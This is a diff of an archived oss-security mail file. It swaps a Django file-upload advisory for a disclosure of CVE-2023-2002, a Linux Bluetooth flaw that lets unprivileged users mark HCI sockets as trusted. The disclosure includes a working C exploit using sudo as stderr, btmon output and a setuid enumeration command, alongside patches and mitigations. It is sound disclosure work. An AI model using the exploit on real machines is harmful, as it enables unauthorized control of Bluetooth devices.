@@ -1,96 +1,238 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/05/03/1
-Message-ID: <7630410f-f813-378f-6bc5-177becdbe56e@gmail.com>
-Date: Wed, 3 May 2023 15:27:32 +0200
-From: Mariusz Felisiak <felisiak.mariusz@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/04/16/3
+Message-ID: <w7boj4fg4x2o2bjz7a7zkjk4bgxqvqyuxycdqqw2dl3bhanh6a@h4jtbccffxgv>
+Date: Sun, 16 Apr 2023 18:12:18 +0800
+From: Ruihan Li <lrh2000@....edu.cn>
 To: oss-security@...ts.openwall.com
-Subject: Django: CVE-2023-31047 Potential bypass of validation when uploading multiple files using one form field
+Cc: Ruihan Li <lrh2000@....edu.cn>
+Subject: CVE-2023-2002: Linux Bluetooth: Unauthorized management command execution
 Content-Type: text/plain; charset=utf-8
 
-https://www.djangoproject.com/weblog/2023/may/03/security-releases/
+Hi,
 
-In accordance with `our security release policy
-<https://docs.djangoproject.com/en/dev/internals/security/>`_, the 
-Django team
-is issuing
-`Django 4.2.1 <https://docs.djangoproject.com/en/dev/releases/4.2.1/>`_,
-`Django 4.1.9 <https://docs.djangoproject.com/en/dev/releases/4.1.9/>`_, and
-`Django 3.2.19 <https://docs.djangoproject.com/en/dev/releases/3.2.19/>`_.
-These releases addresses the security issue detailed below. We encourage all
-users of Django to upgrade as soon as possible.
+An insufficient permission check has been found in the Bluetooth subsystem of
+the Linux kernel when handling ioctl system calls of HCI sockets. This causes
+tasks without the proper CAP_NET_ADMIN capability can easily mark HCI sockets
+as _trusted_. Trusted sockets are intended to enable the sending and receiving
+of management commands and events, such as pairing or connecting with a new
+device.  As a result, unprivileged users can acquire a trusted socket, leading
+to unauthorized execution of management commands. The exploit requires only
+the presence of a set of commonly used setuid programs (e.g., su, sudo).
 
-CVE-2023-31047: Potential bypass of validation when uploading multiple 
-files using one form field
-=================================================================================================
+## Cause
 
-Uploading multiple files using one form field has never been supported by
-``forms.FileField`` or ``forms.ImageField`` as only the last
-uploaded file was validated. Unfortunately, `Uploading multiple files 
-<https://docs.djangoproject.com/en/stable/topics/http/file-uploads/#uploading-multiple-files>`__
-topic suggested otherwise.
+The direct cause of the vulnerability is the following code snippet:
+```c
+static int hci_sock_ioctl(struct socket *sock, unsigned int cmd,
+                          unsigned long arg)
+{
+	...
+        if (hci_sock_gen_cookie(sk)) {
+		...
+                if (capable(CAP_NET_ADMIN))
+                        hci_sock_set_flag(sk, HCI_SOCK_TRUSTED);
+		...
+        }
+	...
+}
+```
 
-In order to avoid the vulnerability, ``ClearableFileInput``
-and `FileInput`` form widgets now raise ``ValueError`` when
-the ``multiple`` HTML attribute is set on them. To prevent the exception and
-keep the old behavior, set ``allow_multiple_selected`` to ``True``.
+The implementation of an ioctl system call verifies whether the task invoking
+the call has the necessary CAP_NET_ADMIN capability to update the
+HCI_SOCK_TRUSTED flag. However, this check only considers the calling task,
+which may not necessarily be the socket opener. For instance, the socket can
+be shared with another task using fork and execve, where the latter task may
+be privileged, such as a setuid program. Moreover, if the socket is used as
+stdout or stderr, an ioctl call is made to obtain tty parameters, which can be
+verified through the strace command.
+```
+# strace -e trace=ioctl sudo > /dev/null
+ioctl(3, TIOCGPGRP, [30305])            = 0
+ioctl(2, TIOCGWINSZ, {ws_row=45, ws_col=190, ws_xpixel=0, ws_ypixel=0}) = 0
+```
 
-For more details on using the new attribute and handling of multiple files
-through a single field, see `Uploading multiple files 
-<https://docs.djangoproject.com/en/stable/topics/http/file-uploads/#uploading-multiple-files>`__.
+The ioctl calls for tty parameters will never succeed on HCI sockets, but they
+are sufficient to mark HCI sockets as trusted. Therefore, an unprivileged
+program can hold trusted HCI sockets, enabling it to send and receive
+management commands and events, since the trusted flag will never be cleared.
 
-Thanks Moataz Al-Sharida and nawaik for reports.
+## Exploit
 
-This issue has severity "low" according to the Django security policy.
+The exploitation can be as easy as below:
+```c
+	int fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
 
-Affected supported versions
-===========================
+	/* By executing sudo with an HCI socket as stderr, an ioctl
+	 * system call makes the HCI socket privileged (i.e. with
+	 * the HCI_SOCK_TRUSTED flag set).
+	 */
+	int pid = fork();
+	if (pid == 0) {
+		dup2(fd, 2);
+		close(fd);
+		execlp("sudo", "sudo");
+	}
 
-* Django main branch
-* Django 4.2
-* Django 4.1
-* Django 3.2
+	waitpid(pid, NULL, 0);
 
-Resolution
-==========
+	struct sockaddr_hci haddr;
+	haddr.hci_family = AF_BLUETOOTH;
+	haddr.hci_dev = HCI_DEV_NONE;
+	haddr.hci_channel = HCI_CHANNEL_CONTROL;
 
-Patches to resolve the issue have been applied to Django's main branch 
-and the
-4.2, 4.1, and 3.2 release branches. The patches may be obtained from the
-following changesets:
+	/* The socket has not been bound. It can be bound to the
+	 * management channel now. After that, the HCI_SOCK_TRUSTED
+	 * flag is still present, as it will indeed never be cleared.
+	 */
+	bind(fd, (struct sockaddr *)&haddr, sizeof(haddr));
+```
 
-* On the `main branch 
-<https://github.com/django/django/commit/fb4c55d9ec4bb812a7fb91fa20510d91645e411b>`__
-* On the `4.2 release branch 
-<https://github.com/django/django/commit/21b1b1fc03e5f9e9f8c977ee6e35618dd3b353dd>`__
-* On the `4.1 release branch 
-<https://github.com/django/django/commit/e7c3a2ccc3a562328600be05068ed9149e12ce64>`__
-* On the `3.2 release branch 
-<https://github.com/django/django/commit/eed53d0011622e70b936e203005f0e6f4ac48965>`__
+Furthermore, btmon can be used to confirm that the socket becomes trusted and
+successive management commands will succeed:
+```
+# btmon
+@ RAW Open: sudo (privileged) version 2.22
+@ RAW Close: sudo
+@ MGMT Open: sudo (privileged) version 1.22
+@ MGMT Command: Set Powered (0x0005) plen 1
+        Powered: Disabled (0x00)
+@ MGMT Event: Command Complete (0x0001) plen 7
+      Set Powered (0x0005) plen 4
+        Status: Success (0x00)
+```
 
-The following releases have been issued:
+A full PoC exploit to change the power state of Bluetooth devices can be found
+[on GitHub][exp].
 
-* Django 4.2.1 (`download Django 4.2.1 
-<https://www.djangoproject.com/m/releases/4.2/Django-4.2.1.tar.gz>`_ | 
-`4.2.1 checksums 
-<https://www.djangoproject.com/m/pgp/Django-4.2.1.checksum.txt>`_)
-* Django 4.1.9 (`download Django 4.1.9 
-<https://www.djangoproject.com/m/releases/4.1/Django-4.1.9.tar.gz>`_ | 
-`4.1.9 checksums 
-<https://www.djangoproject.com/m/pgp/Django-4.1.9.checksum.txt>`_)
-* Django 3.2.19 (`download Django 3.2.19 
-<https://www.djangoproject.com/m/releases/3.2/Django-3.2.19.tar.gz>`_ | 
-`3.2.19 checksums 
-<https://www.djangoproject.com/m/pgp/Django-3.2.19.checksum.txt>`_)
+[exp]: https://github.com/lrh2000/CVE-2023-2002/tree/master/exp
 
-The PGP key ID used for this release is Mariusz Felisiak: 
-`2EF56372BA48CD1B <https://github.com/felixxm.gpg>`_.
+## Impact
 
-General notes regarding security reporting
-==========================================
+If successfully exploited, the identified vulnerability has the potential to
+compromise the confidentiality, integrity, and availability of Bluetooth
+communication. Attackers can exploit this vulnerability to pair the controller
+with malicious devices, even if the Bluetooth service is disabled or not
+installed. It is also possible to prevent specific devices from being paired,
+or read some sensitive information such as the OOB data.
 
-As always, we ask that potential security issues be reported via
-private email to ``security@...ngoproject.com``, and not via Django's
-Trac instance or the django-developers list. Please see `our security
-policies <https://www.djangoproject.com/security/>`_ for further
-information.
+## Affection
+
+The exploitable vulnerability has been present in the Linux kernel since v4.9.
+More specifically, it becomes exploitable after the [commit f81f5b2db869][cm]
+("Bluetooth: Send control open and close messages for HCI raw sockets"). Prior
+to this commit, exploiting the vulnerability required tricking a privileged
+program into binding an HCI socket, which is very hard (if not impossible) to
+trigger in practice. However, after the commit, it requires only tricking a
+privileged program to invoke an ioctl system call, which relies only on the
+existence of an setuid program, as illustrated above.
+
+[cm]: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f81f5b2db869
+
+The exploitation works as long as there are setuid programs (or more
+precisely, programs with the CAP_NET_ADMIN capability) that invokes ioctl
+calls on stdin, stdout, or stderr. In most Linux distros, a quick (but very
+coarse) test reveals that quite a few setuid programs are using ioctl system
+calls, which are marked with 'V' in the table below:
+```
+# find . -user root -perm -4000 -exec sh -c "strace -e trace=ioctl {} < /dev/null 2>&1 > /dev/null | grep ioctl > /dev/null && echo -n 'V ' || echo -n 'S '; echo {};" \; | sort
+S ./chage
+S ./expiry
+S ./fusermount
+S ./fusermount3
+S ./gpasswd
+S ./ksu
+S ./mount.cifs
+S ./sg
+S ./umount
+V ./chfn
+V ./chsh
+V ./mount
+V ./newgrp
+V ./passwd
+V ./pkexec
+V ./screen-4.9.0
+V ./su
+V ./sudo
+V ./unix_chkpwd
+```
+After manually checking the strace output, it is found that all of these ioctl
+users are using ioctl calls on stdin, stdout, or stderr to get or set some tty
+parameters. Note that exactly no arguments are passed to these setuid
+programs. If some crafted arguments are passed, the number of ioctl users may
+increase. As a result, a number of linux distros can be vulnerable to the
+exploitation.
+
+As a side note, Android devices, however, are unlikely to be affected since
+the exploitation requires the existence of setuid programs, which Android has
+[avoided using][su] for some time. Besides, there are also no applications
+with the CAP_NET_ADMIN capability on Android.
+
+[su]: https://source.android.com/docs/security/enhancements/enhancements43
+
+## Mitigation
+
+[A patch][fi] has been posted to the linux-bluetooth mailing list which fixes
+this vulnerability by replacing capable() with sk_capable(), where
+sk_capable() checks not only the current task but also that the socket opener
+has the required capability. At the same time, [another submitted patch][se]
+hardens the ioctl processing logic by checking command validity at the start
+of hci_sock_ioctl() and returning with an ENOIOCTLCMD error code immediately
+before doing anything if the command is invalid.
+
+[fi]: https://lore.kernel.org/linux-bluetooth/20230416081404.8227-1-lrh2000@pku.edu.cn
+[se]: https://lore.kernel.org/linux-bluetooth/20230416080251.7717-1-lrh2000@pku.edu.cn
+
+As a workaround, if the Bluetooth devices are not being used at all (but it is
+not feasible to physically remove the device), it is possible to simply block
+the devices using rfkill, which will prevent the devices from being powered
+up. By doing so, sending management commands to power up Bluetooth devices
+won't succeed. This can significantly reduce the impact of this vulnerability.
+
+There are two ways to avoid similar vulnerabilities in the future: hardening
+the Linux kernel and hardening userspace setuid programs.
+ - There are many uses of capable() in the Linux kernel that check the
+   capability of the current task, but do nothing about the file or socket
+   opener. In many cases, it may be reasonable to also check the capability of
+   the opener. However, adding more capability checks can lead to unexpected
+   regressions, although no such examples in reality have been seen at the
+   time of writing.
+ - Stdin, stdout, and stderr are different from other file descriptors,
+   because they are inherited from the parent task but are used directly by
+   the current task. For privileged setuid programs, inherited file
+   descriptors may need to be treated as untrusted. Therefore, it also seems
+   reasonable to explicitly drop privileges when invoking system calls on
+   these untrusted file descriptors.
+
+## Relation
+
+This vulnerability shares exactly the same principle as [CVE-2014-0181][c14]. In
+the case of CVE-2014-0181, the issue was the lack of a mechanism to authorize
+Netlink operations based on the opener of the socket, which allows local users
+to modify network configurations by using a Netlink socket for the stdout or
+stderr of a setuid program.
+
+[c14]: https://nvd.nist.gov/vuln/detail/CVE-2014-0181
+
+## Timeline
+
+**2023-04-04:** I discovered this vulnerability during my audit of the
+Bluetooth protocol stack in the Linux kernel.
+
+**2023-04-09:** I have reported this vulnerability to the Linux kernel
+security team and distribution vendors, with an initial version of patches.
+
+**2023-04-12:** This vulnerability has been assigned a CVE ID, which is
+CVE-2023-2002.
+
+**2023-04-13:** After several days of discussion with the maintainers, the
+patches have been updated accordingly.
+
+**2023-04-16:** The vulnerability was disclosed on the public oss-security
+mailing list (here) and [on GitHub][gh]. Two patches have been posted to the
+public linux-bluetooth mailing list ([first][fi], [second][se]).
+
+[gh]: https://github.com/lrh2000/CVE-2023-2002
+
+Thanks,
+Ruihan Li
 
